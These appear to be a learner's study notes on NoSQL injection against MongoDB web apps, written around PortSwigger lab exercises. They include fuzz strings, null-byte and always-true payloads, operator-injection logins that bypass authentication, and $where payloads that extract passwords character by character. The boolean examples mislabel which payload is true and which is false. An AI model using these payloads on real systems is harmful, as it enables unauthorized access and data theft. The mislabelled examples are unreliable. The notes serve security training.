NoSQL is a non relational database.
They can vary in syntax and language and data structures they use.

There are two types of NoSQL injections:
- `Syntax injection` - Similar to SQLi, this attack breaks out of the syntax and enables custom payload injection.
- `Operator injection` - Is an type of injection where you can utilize operators to manipulate the queries.

To detect injection vulnerabilities  we can attempt to break the query's `syntax`.
This means fuzzing the input fields with characters that are known to break the syntax.

If we know the database we are dealing with we can utilize more narrow and specialized set of syntax breaking characters.
Otherwise we can use a large set of characters to target multiple API languages.


Consider a following scenario:
```js
https://insecure-website.com/product/lookup?category=fizzy
```

The web app sends a JSON query to set the category of the product in a `MongoDB.
```js
this.category == 'fizzy'
```

To fuzz the input field for MongoDB we can try:
```js
'"`{
;$Foo}
$Foo
\xYZ
```

Using these strings we can construct the following attack.
```js
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```


If this causes some change in the response or it returns an error, that indicates that the user input isn't sanitized or filtered correctly.

*Note:* 
NoSQL injections can occur in wide variety of contexts, this one was in context of a URL.
You will need to adapt your fuzzing and payloads to the context you are in.
For example we URL encoded our URL context fuzzing.

Similarly the fuzzing could fail simply by validation errors for things such as JSON objects.
So we need to adapt our fuzzing accordingly to not cause validation errors.
```js
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000`
```


To determine which characters are interpreted as syntax by the DB you can fuzz with singular characters. `'`
```js
this.category == '''
```

If the app responds differently from this input.
We can validate the test by entering a valid query string, in this case we can escape the (`'`) single quote. 
```js
this.category == '\''
```
If this doesn't cause a syntax error we validated our initial fuzzing test.

#### Conditional behavior testing

After confirming that we can influence the syntax of the query, we start testing for conditionals.
This means the `boolean` syntax of the queries.

The same idea applies we monitor the responses on each attempt to validate our payloads.
If we manage to influence the logic of the query as shown in the response we can confirm `conditional injections`.

Here are the payloads:
- `' && 0 && 'x` - TRUE
- `' && 1 && 'x` - FALSE

After we validate our boolean injections success, we can attempt to override existing conditions to exploit the vulnerability.
For example, a `JS` that always evaluates to `true`.
`'||'1'=='1`
```js
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

Will result in:
```js
this.categoty == 'fizzy'||'1'=='1'
```

After the injection, because the condition always evaluates to true, the query returns all items, even hidden ones.

*Warning:*
Same as in SQLi, using things that always evaluate to true can cause accidental data loss.
This can happen in case the application uses data from one query for others.
Meaning if the app uses that data for later updating/deleting it could be very bad.

#### Overriding existing conditions

Given:
```js
this.category == 'fizzy' && this.released == 1 // show only released products
```

Knowing that the MongoDB may ignore all characters after the `null byte`, we can influence the logical flow of this query.

Seems like the null byte is a reoccurring theme of causing problems.
Such as software ignoring things before/after it. 

If we insert the null byte before the `&&` we could terminate the query prematurely and prevent the filtering of only released products.
Ergo returning `both released and unreleased` products.
```js
https://insecure-website.com/product/lookup?category=fizzy'%00
// results in...
this.category == 'fizzy'\u0000' && this.released == 1
```


**LAB** - app using MongoDB NoSQL database, vulnerable to NoSQL injections, display unreleased products to solve the lab.
**Solution** - As we learned in the examples `filter?category=Pets'||1==1%00`.
The query is terminated with null byte, terminating rest of the query and we add a boolean OR 1=1 which is always true, this returns all we need.

#### Operator injection

The operators are used as a criteria for the data to meet to be included in the query:
- `$where` - Matched documents that satisfy a JS expression.
- `$ne` - Matches all values that do not equal to a specified value.
- `$in` - Matches all values that are specified in an array.
- `$regex` - Select documents which contents match the specified regex.

To test the operators, fuzz the input field and observe the responses.

In JSON messages, you can insert the operator as nested object.
```js
{"username":"wiener"}
// becomes...
{"username":{"$ne":"invalid"}}
```

For URL based inputs.
```js
username=wiener
// becomes...
username[$ne]=invalid
```

In case the URL based method fails, you can convert the request from GET to `POST`.
This can be done manually or by your http proxy program automatically.

1. Change `GET` to `POST`.
2. Change `Content-Type` value to `application/json`.
3. Add `JSON` to message body.
4. `Inject` query operators in the JSON.


#### Detecting operator injection in MongoDB

Consider a vulnerable application which logs in users via a POST request.
With JSON data in the body.
`{"username":"wiener","password":"peter"}`

Testing the operator injection.
`{"username":{"$ne":"invalid"},"password":"peter"}`

This query returns all the users that are not invalid.
If we utilize this method on the password value too.

We will authenticate as the first user in the collection and `bypass the authentication`.

To target a specific account by enumeration or a known account from good recon.
```js
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":"invalid"}}
```

**LAB** - login as admin by exploiting NoSQL injection.
https://portswigger.net/web-security/learning-paths/nosql-injection/nosql-operator-injection/nosql-injection/lab-nosql-injection-bypass-authentication

**Solution** - `{"username":{"$regex":"admin*"},"password":{"$ne":"invalid"}}`
Even though my payload worked, proper regex that I meant is `admin.*` which will match anything starting with admin and ending with  anything.


#### Exploiting syntax injection to exfil data

Some query operators can run limited JS.
For example `$where` from MongoDB, and `mapReduce()` function.

This means that there is a possibility the database may evaluate JS as a query, so in theory you can use JS functions to exfil data.

Consider an app that allows you to check other registered users roles, that functionality sends this request.
`https://insecure-website.com/user/lookup?username=admin`

It results in this NoSQL query.
```js
{"$where":"this.username == 'admin'"}
```

Because this query uses `$where` operator, we can attempt JS function injection.
```js
admin' && this.password[0] == 'a' || 'a'=='b
```

This can help you exfil the password character by character, using the conditional statement.
The part `|| 'a'=='b` serves as logical fail in case of incorrect guess.

If the query fails we know that the letter is not correct at that index.
Else we got a correct letter to index guess.

It can help to identify numbers in the password using JS `match()` regex.
```js
admin' && this.password.match(/\d/) || 'a'=='b
```

#### Identifying field names

In our case using MongoDB, it uses semi-structured data without a required schema.
So before you can exfil data with JS injection, we need to identify these fields.

You would expect that fields that we know exist to return normal response compared to non existing field.
For example identifying the `password` field.
```js
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

So now we test for a non existing field and filed we know exists (username).
```js
admin' && this.username!='
admin' && this.foo!=' // does not exist
```

To identify the field names there are two methods.
1. `Wordlists` - common wordlist brute-force for fields.
2. `Enumeration` - operator injection character by character.

**LAB** - Exfil admin password.
https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data#
**Solution** - Try the lab again after brief glance at the solution I understood the enumeration part for the characters but you can find the length of the password too and there is some finicky stuff going on with using `'` in some places which im not sure what role it plays but i think it's crucial for payload executing properly.